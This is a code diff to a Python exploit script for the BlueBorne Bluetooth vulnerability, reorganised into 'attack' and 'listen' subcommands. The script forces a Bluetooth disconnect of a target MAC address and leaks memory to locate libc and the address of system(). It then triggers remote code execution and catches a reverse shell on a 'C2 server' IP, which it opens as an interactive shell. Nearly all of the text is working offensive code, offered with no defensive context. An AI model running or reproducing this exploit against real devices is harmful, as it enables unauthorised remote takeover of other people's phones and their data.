@@ -1,17 +1,17 @@
+import argparse
+import binascii
 import os
+import select
+import struct
 import sys
 import time
-import struct
-import select
-import binascii
 
 import bluetooth
 from bluetooth import _bluetooth as bt
+from pwn import log
 
 import bluedroid
 import connectback
-
-from pwn import log
 
 # Listening TCP ports that need to be opened on the attacker machine
 NC_PORT = 1233
@@ -186,9 +186,14 @@ def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my
 
     prog.success()
 
-def main(src_hci, dst, my_ip):
+def attack(args):
+    src_hci, target_mac, cc_ip = args.SRC_HCI, args.TARGET_MAC, args.C2_IP
+    log.info('attacking')
+    log.info('Target MAC: {}'.format(target_mac))
+    log.info('C2 IP: {}'.format(cc_ip))
+
     os.system('hciconfig %s sspmode 0' % (src_hci,))
-    os.system('hcitool dc %s' % (dst,))
+    os.system('hcitool dc %s' % (target_mac,))
 
     sh_s, stdin, stdout = connectback.create_sockets(NC_PORT, STDIN_PORT, STDOUT_PORT)
 
@@ -200,29 +205,62 @@ def main(src_hci, dst, my_ip):
 
         # Try to leak section bases
         for j in range(LEAK_ATTEMPTS):
-            libc_text_base, bluetooth_default_bss_base = memory_leak_get_bases(src, src_hci, dst)
+            libc_text_base, bluetooth_default_bss_base = memory_leak_get_bases(src, src_hci, target_mac)
             if (libc_text_base & 0xfff == 0) and (bluetooth_default_bss_base & 0xfff == 0):
                 break
         else:
-           assert False, "Memory doesn't seem to have leaked as expected. Wrong .so versions?"
+            log.error("FAILED: Memory doesn't seem to have leaked as expected. Wrong .so versions?")
+            return 1
 
         system_addr = LIBC_TEXT_STSTEM_OFFSET + libc_text_base
         acl_name_addr = BSS_ACL_REMOTE_NAME_OFFSET + bluetooth_default_bss_base
         assert acl_name_addr % 4 == 0
         log.info('system: 0x%08x, acl_name: 0x%08x' % (system_addr, acl_name_addr))
 
-        pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base)
+        pwn(src_hci, target_mac, bluetooth_default_bss_base, system_addr, acl_name_addr, cc_ip, libc_text_base)
         # Check if we got a connectback
         readable, _, _ = select.select([sh_s], [], [], PWNING_TIMEOUT)
         if readable:
-            log.info('Done')
+            log.info('Pwning successful')
             break
 
     else:
-        assert False, "Pwning failed all attempts"
+        log.error("Pwning failed all attempts")
+        sys.exit(1)
 
-    connectback.interactive_shell(sh_s, stdin, stdout, my_ip, STDIN_PORT, STDOUT_PORT)
+
+def listen(args):
+    cc_ip = args.C2_IP
+    log.info('listening from: {}'.format(cc_ip))
+
+    sh_s, stdin, stdout = connectback.create_sockets(NC_PORT, STDIN_PORT, STDOUT_PORT)
+
+    connectback.interactive_shell(sh_s, stdin, stdout, cc_ip, STDIN_PORT, STDOUT_PORT)
 
 
 if __name__ == '__main__':
-    main(*sys.argv[1:])
+    """
+    Ex: python2 doit-Ace3.py hci0 <MAC-BLUETOOTH-TARGET> <IP-Connect>d .
+    
+    """
+    parser = argparse.ArgumentParser()
+    sub_parsers = parser.add_subparsers(title='BlueBorne')
+
+    parser_attack = sub_parsers.add_parser('attack', help='attack a given target')
+    parser_attack.add_argument('SRC_HCI', action='store', help='source HCI')
+    parser_attack.add_argument('TARGET_MAC', action='store', help='bluetooh MAC address of target')
+    parser_attack.add_argument('C2_IP', action='store', help='IP of the C2 server')
+    parser_attack.set_defaults(func=attack)
+
+    parser_listen = sub_parsers.add_parser('listen', help='act as a C2 server')
+    parser_listen.add_argument('C2_IP', action='store', help='IP of the C2 server')
+    parser_listen.set_defaults(func=listen)
+    args = parser.parse_args()
+    args.func(args)
+
+    # actions = parser.add_mutually_exclusive_group()
+    # actions.add_argument('listen', help='start the listener')
+    # actions.add_argument('attack', help='attack a given target')
+    # parser.add_subparsers()
+    # parser.add_argument("listen")
+    # sys.exit(main(*sys.argv[1:]))
